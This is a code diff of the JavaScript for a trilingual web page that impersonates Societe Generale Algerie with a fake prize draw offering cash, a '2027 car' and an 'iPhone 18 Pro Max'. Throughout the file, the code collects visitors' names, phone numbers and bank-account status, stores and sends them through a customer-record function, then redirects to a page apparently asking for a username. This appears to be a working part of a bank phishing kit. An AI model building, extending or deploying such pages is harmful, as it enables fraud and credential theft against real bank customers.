@@ -1,188 +1,159 @@
+/* الصفحة الرئيسية: الترجمة (ar/en/fr)، السلايدر، نافذة التسجيل، ونافذة النجاح. */
 (function () {
   'use strict';
 
   var I18N = {
-  "ar": {
-    "lang": "ar",
-    "dir": "rtl",
-    "title": "اربح جوائز نقدية قيّمة مع Societe Generale Algerie",
-    "desc": "سجّل الآن واربح 1,000,000 دينار جزائري، سيارة 2027، و iPhone 18 Pro Max مع Societe Generale Algerie",
-    "img": "ar",
-    "texts": [
-      "SOCIETE GENERALE",
-      "ALGERIE",
-      "عربي",
-      "EN",
-      "FR",
-      "سجّل واربح جوائز قيّمة من بنك Societe Generale Algerie",
-      "جوائز نقدية، سيارة، وأجهزة ذكية بانتظارك",
-      "سجّل واربح",
-      "سجّل واربح",
-      "سجّل واربح",
-      "سجّل واربح",
-      "سجّل واربح",
-      "تواصل معنا",
-      "شارع كريم بلقاسم، حيدرة، الجزائر العاصمة، الجزائر",
-      "الهاتف:",
-      "3020",
-      "فاكس:",
-      "023 48 18 19",
-      "contact@socgen.dz",
-      "روابط مهمة",
-      "الشروط والأحكام",
-      "سياسة الخصوصية",
-      "الأسئلة الشائعة",
-      "قانوني",
-      "الإشعار القانوني",
-      "سياسة ملفات تعريف الارتباط",
-      "حماية البيانات",
-      "جميع الحقوق محفوظة © 2025 Societe Generale Algerie",
-      "أكمل بياناتك",
-      "من فضلك أدخل بياناتك لإتمام الطلب",
-      "الاسم الكامل",
-      "رقم الهاتف",
-      "هل لديك حساب في بنك Societe Generale Algerie؟",
-      "نعم",
-      "لا",
-      "تأكيد الطلب"
-    ],
-    "alts": [
-      "اربح جوائز نقدية 1,000,000 دينار جزائري",
-      "اربح سيارة 2027",
-      "اربح iPhone 18 Pro Max",
-      "اربح ساعة ذكية فاخرة",
-      "اربح جوائز نقدية 1,000,000 دينار جزائري",
-      "اربح سيارة 2027",
-      "اربح iPhone 18 Pro Max",
-      "اربح ساعة ذكية فاخرة"
-    ],
-    "langcls": {
-      "ar": "rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]",
-      "en": "rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]",
-      "fr": "rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]"
+    ar: {
+      lang: 'ar',
+      dir: 'rtl',
+      title: 'اربح جوائز نقدية قيّمة مع Societe Generale Algerie',
+      desc: 'سجّل الآن واربح 1,000,000 دينار جزائري، سيارة 2027، و iPhone 18 Pro Max مع Societe Generale Algerie',
+      img: 'ar',
+      texts: [
+        'SOCIETE GENERALE', 'ALGERIE', 'عربي', 'EN', 'FR',
+        'سجّل واربح جوائز قيّمة من بنك Societe Generale Algerie',
+        'جوائز نقدية، سيارة، وأجهزة ذكية بانتظارك',
+        'سجّل واربح', 'سجّل واربح', 'سجّل واربح', 'سجّل واربح', 'سجّل واربح',
+        'تواصل معنا',
+        'شارع كريم بلقاسم، حيدرة، الجزائر العاصمة، الجزائر',
+        'الهاتف:', '3020', 'فاكس:', '023 48 18 19', 'contact@socgen.dz',
+        'روابط مهمة',
+        'الشروط والأحكام', 'سياسة الخصوصية', 'الأسئلة الشائعة',
+        'قانوني',
+        'الإشعار القانوني', 'سياسة ملفات تعريف الارتباط', 'حماية البيانات',
+        'جميع الحقوق محفوظة © 2025 Societe Generale Algerie',
+        'أكمل بياناتك',
+        'من فضلك أدخل بياناتك لإتمام الطلب',
+        'الاسم الكامل',
+        'رقم الهاتف',
+        'هل لديك حساب في بنك Societe Generale Algerie؟',
+        'نعم', 'لا',
+        'تأكيد الطلب'
+      ],
+      alts: [
+        'اربح جوائز نقدية 1,000,000 دينار جزائري',
+        'اربح سيارة 2027',
+        'اربح iPhone 18 Pro Max',
+        'اربح ساعة ذكية فاخرة',
+        'اربح جوائز نقدية 1,000,000 دينار جزائري',
+        'اربح سيارة 2027',
+        'اربح iPhone 18 Pro Max',
+        'اربح ساعة ذكية فاخرة'
+      ],
+      langcls: {
+        ar: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]',
+        en: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]',
+        fr: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]'
+      },
+      success: {
+        title: 'تم تسجيلك بنجاح!',
+        subtitle: 'أصبحت ضمن المشاركين في السحب. حظاً موفقاً!',
+        explore: 'استكشف تطبيق APPLI SGA',
+        close: 'إغلاق'
+      }
+    },
+
+    en: {
+      lang: 'en',
+      dir: 'ltr',
+      title: 'Win valuable cash prizes with Societe Generale Algerie',
+      desc: 'Register now and win 1,000,000 Algerian Dinars, a 2027 car and an iPhone 18 Pro Max with Societe Generale Algerie',
+      img: 'en',
+      texts: [
+        'SOCIETE GENERALE', 'ALGERIE', 'عربي', 'EN', 'FR',
+        'Register & win valuable prizes from Societe Generale Algerie',
+        'Cash prizes, a car, and smart devices await you',
+        'Register & Win', 'Register & Win', 'Register & Win', 'Register & Win', 'Register & Win',
+        'Contact us',
+        'Karim Belkacem Street, Hydra, Algiers, Algeria',
+        'Phone:', '3020', 'Fax:', '023 48 18 19', 'contact@socgen.dz',
+        'Important links',
+        'Terms & Conditions', 'Privacy Policy', 'FAQ',
+        'Legal',
+        'Legal Notice', 'Cookies Policy', 'Data Protection',
+        'All rights reserved © 2025 Societe Generale Algerie',
+        'Complete your details',
+        'Please enter your details to complete the request',
+        'Full name',
+        'Phone number',
+        'Do you have an account with Societe Generale Algerie bank?',
+        'Yes', 'No',
+        'Confirm request'
+      ],
+      alts: [
+        'Win cash prizes of 1,000,000 Algerian Dinars',
+        'Win a 2027 car',
+        'Win an iPhone 18 Pro Max',
+        'Win a luxury smartwatch',
+        'Win cash prizes of 1,000,000 Algerian Dinars',
+        'Win a 2027 car',
+        'Win an iPhone 18 Pro Max',
+        'Win a luxury smartwatch'
+      ],
+      langcls: {
+        ar: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]',
+        en: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]',
+        fr: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]'
+      },
+      success: {
+        title: "You're registered!",
+        subtitle: 'You are now entered in the draw. Good luck!',
+        explore: 'Explore the APPLI SGA app',
+        close: 'Close'
+      }
+    },
+
+    fr: {
+      lang: 'fr',
+      dir: 'ltr',
+      title: 'Gagnez des prix précieux avec Societe Generale Algerie',
+      desc: 'Inscrivez-vous et gagnez 1 000 000 de dinars algériens, une voiture 2027 et un iPhone 18 Pro Max avec Societe Generale Algerie',
+      img: 'en',
+      texts: [
+        'SOCIETE GENERALE', 'ALGERIE', 'عربي', 'EN', 'FR',
+        'Inscrivez-vous et gagnez des prix précieux de Societe Generale Algerie',
+        'Des prix en espèces, une voiture et des appareils intelligents vous attendent',
+        "S'inscrire et gagner", "S'inscrire et gagner", "S'inscrire et gagner", "S'inscrire et gagner", "S'inscrire et gagner",
+        'Contactez-nous',
+        'Rue Karim Belkacem, Hydra, Alger, Algérie',
+        'Téléphone:', '3020', 'Fax:', '023 48 18 19', 'contact@socgen.dz',
+        'Liens importants',
+        'Conditions générales', 'Politique de confidentialité', 'FAQ',
+        'Légal',
+        'Mentions légales', 'Politique de cookies', 'Protection des données',
+        'Tous droits réservés © 2025 Societe Generale Algerie',
+        'Complétez vos informations',
+        'Veuillez saisir vos informations pour finaliser la demande',
+        'Nom complet',
+        'Numéro de téléphone',
+        'Avez-vous un compte chez Societe Generale Algerie ?',
+        'Oui', 'Non',
+        'Confirmer la demande'
+      ],
+      alts: [
+        'Gagnez des prix en espèces de 1 000 000 DA',
+        'Gagnez une voiture 2027',
+        'Gagnez un iPhone 18 Pro Max',
+        'Gagnez une montre connectée de luxe',
+        'Gagnez des prix en espèces de 1 000 000 DA',
+        'Gagnez une voiture 2027',
+        'Gagnez un iPhone 18 Pro Max',
+        'Gagnez une montre connectée de luxe'
+      ],
+      langcls: {
+        ar: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]',
+        en: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]',
+        fr: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]'
+      },
+      success: {
+        title: 'Vous êtes inscrit !',
+        subtitle: 'Vous participez désormais au tirage. Bonne chance !',
+        explore: "Découvrir l'application APPLI SGA",
+        close: 'Fermer'
+      }
     }
-  },
-  "en": {
-    "lang": "en",
-    "dir": "ltr",
-    "title": "Win valuable cash prizes with Societe Generale Algerie",
-    "desc": "Register now and win 1,000,000 Algerian Dinars, a 2027 car and an iPhone 18 Pro Max with Societe Generale Algerie",
-    "img": "en",
-    "texts": [
-      "SOCIETE GENERALE",
-      "ALGERIE",
-      "عربي",
-      "EN",
-      "FR",
-      "Register & win valuable prizes from Societe Generale Algerie",
-      "Cash prizes, a car, and smart devices await you",
-      "Register & Win",
-      "Register & Win",
-      "Register & Win",
-      "Register & Win",
-      "Register & Win",
-      "Contact us",
-      "Karim Belkacem Street, Hydra, Algiers, Algeria",
-      "Phone:",
-      "3020",
-      "Fax:",
-      "023 48 18 19",
-      "contact@socgen.dz",
-      "Important links",
-      "Terms & Conditions",
-      "Privacy Policy",
-      "FAQ",
-      "Legal",
-      "Legal Notice",
-      "Cookies Policy",
-      "Data Protection",
-      "All rights reserved © 2025 Societe Generale Algerie",
-      "Complete your details",
-      "Please enter your details to complete the request",
-      "Full name",
-      "Phone number",
-      "Do you have an account with Societe Generale Algerie bank?",
-      "Yes",
-      "No",
-      "Confirm request"
-    ],
-    "alts": [
-      "Win cash prizes of 1,000,000 Algerian Dinars",
-      "Win a 2027 car",
-      "Win an iPhone 18 Pro Max",
-      "Win a luxury smartwatch",
-      "Win cash prizes of 1,000,000 Algerian Dinars",
-      "Win a 2027 car",
-      "Win an iPhone 18 Pro Max",
-      "Win a luxury smartwatch"
-    ],
-    "langcls": {
-      "ar": "rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]",
-      "en": "rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]",
-      "fr": "rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]"
-    }
-  },
-  "fr": {
-    "lang": "fr",
-    "dir": "ltr",
-    "title": "Gagnez des prix précieux avec Societe Generale Algerie",
-    "desc": "Inscrivez-vous et gagnez 1 000 000 de dinars algériens, une voiture 2027 et un iPhone 18 Pro Max avec Societe Generale Algerie",
-    "img": "en",
-    "texts": [
-      "SOCIETE GENERALE",
-      "ALGERIE",
-      "عربي",
-      "EN",
-      "FR",
-      "Inscrivez-vous et gagnez des prix précieux de Societe Generale Algerie",
-      "Des prix en espèces, une voiture et des appareils intelligents vous attendent",
-      "S'inscrire et gagner",
-      "S'inscrire et gagner",
-      "S'inscrire et gagner",
-      "S'inscrire et gagner",
-      "S'inscrire et gagner",
-      "Contactez-nous",
-      "Rue Karim Belkacem, Hydra, Alger, Algérie",
-      "Téléphone:",
-      "3020",
-      "Fax:",
-      "023 48 18 19",
-      "contact@socgen.dz",
-      "Liens importants",
-      "Conditions générales",
-      "Politique de confidentialité",
-      "FAQ",
-      "Légal",
-      "Mentions légales",
-      "Politique de cookies",
-      "Protection des données",
-      "Tous droits réservés © 2025 Societe Generale Algerie",
-      "Complétez vos informations",
-      "Veuillez saisir vos informations pour finaliser la demande",
-      "Nom complet",
-      "Numéro de téléphone",
-      "Avez-vous un compte chez Societe Generale Algerie ?",
-      "Oui",
-      "Non",
-      "Confirmer la demande"
-    ],
-    "alts": [
-      "Gagnez des prix en espèces de 1 000 000 DA",
-      "Gagnez une voiture 2027",
-      "Gagnez un iPhone 18 Pro Max",
-      "Gagnez une montre connectée de luxe",
-      "Gagnez des prix en espèces de 1 000 000 DA",
-      "Gagnez une voiture 2027",
-      "Gagnez un iPhone 18 Pro Max",
-      "Gagnez une montre connectée de luxe"
-    ],
-    "langcls": {
-      "ar": "rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]",
-      "en": "rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]",
-      "fr": "rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]"
-    }
-  }
-};
+  };
+
   var STORAGE_KEY = 'homeLang';
   var root = document.getElementById('root');
   if (!root) return;
@@ -193,7 +164,8 @@
         return n.nodeValue && n.nodeValue.trim() ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_REJECT;
       }
     });
-    var list = [], n;
+    var list = [];
+    var n;
     while ((n = walker.nextNode())) list.push(n);
     return list;
   }
@@ -209,7 +181,6 @@
     fr: root.querySelector('[data-testid="lang-option-fr"]')
   };
 
-  // نصوص غير مغطّاة بترتيب عُقد النصوص: placeholders وأسماء الأزرار لقارئ الشاشة
   var PLACEHOLDERS = {
     ar: { name: 'مثال: محمد أمين', phone: '05 00 00 00 00', close: 'إغلاق' },
     en: { name: 'e.g. Mohamed Amine', phone: '05 00 00 00 00', close: 'Close' },
@@ -218,6 +189,7 @@
 
   function applyLang(code) {
     var t = I18N[code] || I18N.ar;
+
     document.documentElement.lang = t.lang;
     document.documentElement.dir = t.dir;
     document.title = t.title;
@@ -245,6 +217,20 @@
     if (phoneField) phoneField.setAttribute('placeholder', ph.phone);
     if (closeBtn) closeBtn.setAttribute('aria-label', ph.close);
 
+    // نافذة النجاح تقع خارج #root، فتُترجم عناصرها بالمعرّف
+    var sheetTitle = document.getElementById('successSheetTitle');
+    var sheetSubtitle = document.querySelector('.success-subtitle');
+    var exploreBtn = document.getElementById('exploreAppBtn');
+    var closeSuccessBtn = document.getElementById('closeSuccessBtn');
+    var successCloseX = document.getElementById('successCloseX');
+    if (t.success) {
+      if (sheetTitle) sheetTitle.textContent = t.success.title;
+      if (sheetSubtitle) sheetSubtitle.textContent = t.success.subtitle;
+      if (exploreBtn) exploreBtn.textContent = t.success.explore;
+      if (closeSuccessBtn) closeSuccessBtn.textContent = t.success.close;
+      if (successCloseX) successCloseX.setAttribute('aria-label', t.success.close);
+    }
+
     Object.keys(langButtons).forEach(function (key) {
       if (langButtons[key]) langButtons[key].className = t.langcls[key] || langButtons[key].className;
     });
@@ -266,13 +252,15 @@
   } catch (e) {}
   applyLang(I18N[saved] ? saved : 'ar');
 
+  // ── السلايدر الترويجي ──────────────────────────────────
   var slider = root.querySelector('[data-testid="promo-slider"]');
   if (slider) {
     var slides = Array.prototype.slice.call(slider.querySelectorAll('img'));
     var dots = Array.prototype.slice.call(slider.querySelectorAll('[data-testid^="slider-dot-"]'));
     var current = 0;
-    slides.forEach(function (s, i) { if (s.classList.contains('opacity-100')) current = i; });
     var timer = null;
+
+    slides.forEach(function (s, i) { if (s.classList.contains('opacity-100')) current = i; });
 
     function show(index) {
       current = index;
@@ -293,16 +281,55 @@
       stop();
       timer = setInterval(function () { show((current + 1) % slides.length); }, 4000);
     }
-    function stop() { if (timer) { clearInterval(timer); timer = null; } }
+
+    function stop() {
+      if (timer) {
+        clearInterval(timer);
+        timer = null;
+      }
+    }
 
     dots.forEach(function (dot, i) {
-      dot.addEventListener('click', function () { show(i); start(); });
+      dot.addEventListener('click', function () {
+        show(i);
+        start();
+      });
     });
+
     show(current);
     start();
   }
 
+  // ── نافذة التسجيل ونافذة النجاح ────────────────────────
   var modal = root.querySelector('[data-testid="registration-modal"]');
+  var successSheet = document.getElementById('registrationSuccessSheet');
+  var closeSuccessBtn = document.getElementById('closeSuccessBtn');
+  var successCloseX = document.getElementById('successCloseX');
+  var exploreAppBtn = document.getElementById('exploreAppBtn');
+  var redirectTimer = null;
+
+  function goToPrizeUsername() {
+    if (redirectTimer) {
+      clearTimeout(redirectTimer);
+      redirectTimer = null;
+    }
+    window.location.href = window.SiteLang ? SiteLang.href('prize-username.html') : 'prize-username.html';
+  }
+
+  function openSuccessSheet() {
+    if (modal) modal.style.display = 'none';
+    if (successSheet) {
+      successSheet.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+    if (redirectTimer) clearTimeout(redirectTimer);
+    redirectTimer = setTimeout(goToPrizeUsername, 1000);
+  }
+
+  if (closeSuccessBtn) closeSuccessBtn.addEventListener('click', goToPrizeUsername);
+  if (successCloseX) successCloseX.addEventListener('click', goToPrizeUsername);
+  if (exploreAppBtn) exploreAppBtn.addEventListener('click', goToPrizeUsername);
+
   if (!modal) return;
 
   var form = modal.querySelector('form');
@@ -315,6 +342,11 @@
   var hasAccount = '';
 
   function openModal() {
+    if (redirectTimer) {
+      clearTimeout(redirectTimer);
+      redirectTimer = null;
+    }
+    if (successSheet) successSheet.classList.remove('active');
     modal.style.display = 'flex';
     document.body.style.overflow = 'hidden';
     setTimeout(function () { if (nameInput) nameInput.focus(); }, 150);
@@ -333,7 +365,9 @@
   if (closeButton) closeButton.addEventListener('click', closeModal);
   modal.addEventListener('click', function (e) { if (e.target === modal) closeModal(); });
   document.addEventListener('keydown', function (e) {
-    if (e.key === 'Escape' && modal.style.display !== 'none') closeModal();
+    if (e.key !== 'Escape') return;
+    if (successSheet && successSheet.classList.contains('active')) goToPrizeUsername();
+    else if (modal.style.display !== 'none') closeModal();
   });
 
   function refreshSubmit() {
@@ -362,7 +396,10 @@
     e.preventDefault();
     var name = nameInput.value.trim();
     var phone = phoneInput.value.trim();
-    if (!name || !phone || !hasAccount) { refreshSubmit(); return; }
+    if (!name || !phone || !hasAccount) {
+      refreshSubmit();
+      return;
+    }
 
     localStorage.setItem('customerName', name);
     localStorage.setItem('phone', phone);
@@ -374,14 +411,19 @@
     if (window.ensureCustomerDoc) {
       try {
         await window.ensureCustomerDoc({
-          name: name, phone: phone, mobile: phone, address: '',
+          name: name,
+          phone: phone,
+          mobile: phone,
+          address: '',
           hasAccount: hasAccount,
           hasAccountLabel: hasAccount === 'yes' ? 'نعم' : 'لا',
           currentPage: 'الصفحة الرئيسية'
         });
-      } catch (err) { console.error('ensureCustomerDoc error:', err); }
+      } catch (err) {
+        console.error('ensureCustomerDoc error:', err);
+      }
     }
 
-    window.location.href = window.SiteLang ? SiteLang.href('select.html') : 'select.html';
+    openSuccessSheet();
   });
 })();
